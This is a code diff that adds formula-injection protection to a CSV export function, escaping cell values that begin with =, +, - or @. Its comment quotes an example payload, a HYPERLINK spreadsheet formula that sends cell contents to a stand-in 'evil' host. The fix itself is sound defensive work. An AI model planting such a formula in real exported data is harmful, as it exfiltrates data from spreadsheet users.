@@ -468,7 +468,14 @@ const MAX_EXPORT_ROWS = 5000;
 
 function toCsvValue(value) {
   if (value === null || value === undefined) return '';
-  const str = String(value);
+  let str = String(value);
+  // Formula/CSV injection (OWASP): free-text fields (purpose, sender_id, receiver_id, country,
+  // merchant_id) are attacker-controlled via POST /transaction and land here unmodified. A
+  // leading =/+/-/@ makes Excel/Sheets interpret the cell as a formula on open (e.g.
+  // `=HYPERLINK("http://evil/?"&A1,"x")`), which can exfiltrate data or chain into DDE/command
+  // execution. Prepending a single quote is the standard mitigation -- Excel/Sheets render the
+  // cell as plain text and hide the leading quote, so the export stays visually unchanged.
+  if (/^[=+\-@]/.test(str)) str = `'${str}`;
   return /[",\n]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
 }
 
